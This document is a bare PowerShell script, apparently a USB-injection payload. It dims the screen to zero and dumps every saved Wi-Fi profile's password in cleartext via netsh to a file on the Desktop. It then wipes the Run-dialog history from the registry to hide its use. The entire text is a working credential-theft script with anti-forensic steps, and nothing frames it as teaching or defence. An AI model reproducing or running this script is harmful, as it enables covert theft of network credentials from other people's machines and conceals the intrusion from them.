(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,0); 


cd $env:USERPROFILE\Desktop;


(netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
    $name=$_.ToString().Trim() -replace "^\s+All User Profile\s+:\s+", ""; 
    (netsh wlan show profile name="$name" key=clear) 
} | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
    $pass=$_.ToString().Trim() -replace "^\s+Key Content\s+:\s+", ""; 
    [PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }
} | Format-Table -AutoSize | Out-File wifi_passwords.txt


Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*"
